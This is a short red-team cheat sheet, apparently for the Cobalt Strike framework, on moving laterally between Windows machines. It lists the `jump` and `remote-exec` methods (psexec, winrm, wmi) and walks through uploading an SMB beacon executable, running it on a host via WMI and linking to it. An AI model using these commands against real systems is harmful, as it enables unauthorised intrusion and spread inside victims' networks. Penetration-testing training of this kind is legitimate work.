# Lateral Movement
For lateral movement you can use `jump`, `remote-exec` and some of `Seatbelt's commands`.

Don't forget to test local admin access on a target `listing the C$ share` remotely!

## jump
  - The syntax is jump [method] [target] [listener]
  - Type `jump` to see a list of methods
  ```
  psexec            x86   Use a service to run a Service EXE artifact
  psexec64          x64   Use a service to run a Service EXE artifact
  psexec_psh        x86   Use a service to run a PowerShell one-liner
  winrm             x86   Run a PowerShell script via WinRM
  winrm64           x64   Run a PowerShell script via WinRM 
  ```

## remote-exec 
- The syntax is remote-exec [method] [target] [command]. 
- Type `remote-exec` to see a list of methods.
```
 psexec             Remote execute via Service Control Manager
 winrm              Remote execute via WinRM (PowerShell)
 wmi                Remote execute via WMI
```

## Windows Management Instrumentation (WMI)
  - Generate an x64 Windows EXE for the SMB listener
  - Upload it to the target by cd'ing to the desired path
  - Use the upload command.
  - Run ```remote-exec wmi workstation-1 C:\Windows\beacon-smb.exe``` i.e
  - Connect to the process using ```link workstation-1```
